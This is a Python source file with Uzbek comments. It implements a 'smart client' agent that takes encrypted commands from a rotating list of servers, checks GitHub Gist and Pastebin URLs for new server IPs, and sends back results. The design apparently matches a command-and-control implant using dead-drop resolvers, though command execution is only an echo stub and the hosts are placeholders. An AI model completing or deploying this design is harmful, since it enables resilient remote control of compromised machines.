"""
Smart Client - IP o'zgarsa avtomatik reconnect qiluvchi agent
"""
import socket
import time
import json
import sys
import os

# Common modullarni import qilish
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from common.ip_updater import IPUpdater
from common.commands import Commands
from common.crypto import encrypt_message, decrypt_message


class SmartClient:
    """Aqlli client - IP o'zgarsa ham ishlaydi"""
    
    def __init__(self):
        self.sock = None
        self.current_server = None
        
        # Fallback server list
        self.servers = []
        
        # IP updater
        self.ip_updater = IPUpdater()
        
        # Config
        self.retry_delay = 5  # Qayta urinish vaqti (sekund)
        self.max_retries = 3  # Har bir server uchun
        self.update_check_interval = 300  # IP update check (5 minut)
        self.last_update_check = 0
        
    def add_server(self, host, port=9999):
        """Fallback server qo'shish"""
        self.servers.append({'host': host, 'port': port})
        
    def add_ip_update_source(self, source_type, url):
        """IP update source qo'shish
        
        Args:
            source_type: 'github_gist', 'pastebin', 'custom'
            url: URL manzil
        """
        if source_type == 'github_gist':
            self.ip_updater.add_github_gist(url)
        elif source_type == 'pastebin':
            self.ip_updater.add_pastebin(url)
        elif source_type == 'custom':
            self.ip_updater.add_custom_url(url)
            
    def check_for_ip_updates(self):
        """IP update bormi tekshirish"""
        current_time = time.time()
        
        # Vaqti kelmagan bo'lsa, skip
        if current_time - self.last_update_check < self.update_check_interval:
            return
            
        self.last_update_check = current_time
        
        print("🔍 IP update tekshirilmoqda...")
        
        try:
            updated_ips = self.ip_updater.get_updated_ips()
            
            if updated_ips:
                print(f"✅ {len(updated_ips)} ta yangi IP topildi")
                
                # Yangi IP larni qo'shish
                for ip in updated_ips:
                    # Agar IP allaqachon bo'lmasa
                    if not any(s['host'] == ip for s in self.servers):
                        self.add_server(ip)
                        print(f"  ➕ Yangi server: {ip}")
                        
        except Exception as e:
            print(f"⚠️ IP update xatosi: {e}")
            
    def connect(self):
        """Birinchi available serverga ulanish"""
        
        # IP update check
        self.check_for_ip_updates()
        
        if not self.servers:
            print("❌ Server list bo'sh!")
            return False
            
        # Har bir serverni sinab ko'rish
        for server in self.servers:
            host = server['host']
            port = server['port']
            
            print(f"🔌 {host}:{port} ga ulanmoqda...")
            
            for attempt in range(self.max_retries):
                try:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.settimeout(10)
                    self.sock.connect((host, port))
                    
                    self.current_server = server
                    print(f"✅ {host}:{port} ga ulandi!")
                    return True
                    
                except (ConnectionRefusedError, socket.timeout, OSError) as e:
                    print(f"  ❌ Attempt {attempt + 1}/{self.max_retries}: {e}")
                    
                    if self.sock:
                        self.sock.close()
                        self.sock = None
                        
                    if attempt < self.max_retries - 1:
                        time.sleep(self.retry_delay)
                        
            print(f"⚠️ {host}:{port} dan javob yo'q, keyingisiga o'tilmoqda...\n")
            
        print("❌ Hech bir serverga ulanib bo'lmadi!")
        return False
        
    def reconnect(self):
        """Ulanish uzilsa qayta ulanish"""
        print("🔄 Qayta ulanish...")
        
        # Eski socket ni yopish
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None
            
        # Avval joriy serverni sinash
        if self.current_server:
            # Joriy serverni list boshiga o'tkazish
            if self.current_server in self.servers:
                self.servers.remove(self.current_server)
                self.servers.insert(0, self.current_server)
                
        # Qayta ulanish
        return self.connect()
        
    def send(self, data):
        """Ma'lumot yuborish"""
        if not self.sock:
            raise Exception("Socket ulangan emas!")
            
        try:
            encrypted = encrypt_message(data)
            self.sock.sendall(encrypted.encode() + b'\n')
            return True
        except (BrokenPipeError, ConnectionResetError, OSError):
            print("❌ Ulanish uzildi!")
            return False
            
    def receive(self):
        """Ma'lumot qabul qilish"""
        if not self.sock:
            raise Exception("Socket ulangan emas!")
            
        try:
            data = self.sock.recv(4096).decode().strip()
            if not data:
                raise ConnectionResetError("Server ulanishni yopdi")
                
            decrypted = decrypt_message(data)
            return decrypted
        except (ConnectionResetError, OSError):
            print("❌ Ulanish uzildi!")
            return None
            
    def run(self):
        """Main loop"""
        print("🚀 Smart Client ishga tushdi\n")
        
        while True:
            # Ulanish
            if not self.connect():
                print(f"⏳ {self.retry_delay} sekund kutilmoqda...")
                time.sleep(self.retry_delay)
                continue
                
            # Main loop
            while True:
                try:
                    # IP update check (background)
                    self.check_for_ip_updates()
                    
                    # Serverdan buyruq kutish
                    command = self.receive()
                    
                    if command is None:
                        # Ulanish uzildi
                        break
                        
                    print(f"📥 Buyruq: {command}")
                    
                    # Buyruqni bajarish
                    response = self.execute_command(command)
                    
                    # Javob yuborish
                    if not self.send(response):
                        break
                        
                except KeyboardInterrupt:
                    print("\n🛑 To'xtatildi")
                    return
                except Exception as e:
                    print(f"❌ Xato: {e}")
                    break
                    
            # Reconnect
            print(f"\n⏳ {self.retry_delay} sekund kutilmoqda...\n")
            time.sleep(self.retry_delay)
            
    def execute_command(self, command):
        """Buyruqni bajarish"""
        # Bu yerda buyruq bajarish logikasi
        # commands.py dan foydalanish mumkin
        
        try:
            # Simple echo for now
            return f"Executed: {command}"
        except Exception as e:
            return f"Error: {e}"
            
    def close(self):
        """Socket ni yopish"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass


# Example usage
if __name__ == '__main__':
    client = SmartClient()
    
    # Primary server
    client.add_server('127.0.0.1', 9999)
    
    # Backup servers
    client.add_server('backup1.example.com', 9999)
    client.add_server('backup2.example.com', 9999)
    
    # IP update source (GitHub Gist)
    # client.add_ip_update_source('github_gist', 
    #     'https://gist.githubusercontent.com/user/id/raw/config.json')
    
    # IP update source (Pastebin)
    # client.add_ip_update_source('pastebin',
    #     'https://pastebin.com/raw/xxxxx')
    
    print("📋 Server list:")
    for i, server in enumerate(client.servers, 1):
        print(f"  {i}. {server['host']}:{server['port']}")
    print()
    
    # Run
    try:
        client.run()
    except KeyboardInterrupt:
        print("\n🛑 To'xtatildi")
    finally:
        client.close()
